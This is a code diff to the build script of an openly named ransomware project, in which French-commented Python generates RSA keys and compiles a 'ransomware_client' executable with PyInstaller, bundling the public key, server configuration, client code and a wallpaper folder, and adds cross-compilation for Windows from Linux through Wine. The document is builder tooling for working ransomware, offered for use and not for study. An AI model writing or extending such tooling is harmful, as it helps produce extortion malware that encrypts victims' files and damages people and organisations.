@@ -6,6 +6,7 @@ import sys
 import time
 import configparser
 import argparse
+import platform
 from tools.utils import resource_path
 from tqdm import tqdm
 from colorama import Fore, Style, init
@@ -34,6 +35,14 @@ def load_config():
 def save_config(config):
     with open('server/config.ini', 'w') as configfile:
         config.write(configfile)
+
+def is_wine_installed():
+    # Vérifier si Wine est installé sur le système
+    try:
+        subprocess.run(['wine', '--version'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        return True
+    except FileNotFoundError:
+        return False
 
 def generate_rsa_keys():
     print(Fore.CYAN + "Génération des clés RSA...")
@@ -70,27 +79,54 @@ def generate_rsa_keys():
     return private_key, public_key
 
 def compile_executable():
-    print(Fore.CYAN + "Compilation de l'exécutable...")
+    # Détecter le système d'exploitation
+    system = platform.system()
+    print(Fore.CYAN + f"Système d'exploitation détecté : {system}")
+
     # Supprimer les dossier dist et build s'ils existent déjà
     if os.path.exists('dist'):
         shutil.rmtree('dist')
     if os.path.exists('build'):
         shutil.rmtree('build')
 
-    # Compiler l'exécutable avec PyInstaller
-    process = subprocess.Popen([
-        'pyinstaller', '--onefile', '--windowed', '--name=ransomware_client',
+    # Définir la commande de base
+    command = [
+        'pyinstaller',
+        '--onefile', '--windowed',
+        '--noconfirm', '--clean',
+        '--name=ransomware_client',
         '--add-data', 'keys/public_key.pem:keys',
         '--add-data', 'server/config.ini:server',
         '--add-data', 'client:client',  # Inclure tout le répertoire client
         '--add-data', 'tools:tools',
         '--add-data', 'wallpaper:wallpaper',
+        #'--icon=client/icon.ico',  # Chemin vers l'icône
         'client/client.py'
-    ],
-    stdout=subprocess.PIPE, stderr=subprocess.PIPE
+    ]
+
+    # Si sur Linux, vérifier que Wine est installé
+    if system == 'Linux':
+        if is_wine_installed():
+            command = ['wine'] + command
+            print(Fore.YELLOW + "Compilation de l'exécutable sous Wine...")
+        else:
+            print(Fore.RED + "Wine n'est pas installé. Veuillez installer Wine pour compiler sous Linux.")
+            return
+    elif system == 'Windows':
+        print(Fore.CYAN + "Compilation de l'exécutable...")
+    else:
+        print(Fore.RED + "Système d'exploitation non pris en charge pour la compilation.")
+        return
+
+    # Exécuter la commande
+    process = subprocess.Popen(
+        command,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE
     )
 
     stdout, stderr = process.communicate()
+
     if process.returncode != 0:
         print(Fore.RED + "Erreur lors de la compilation :")
         print(stderr.decode())
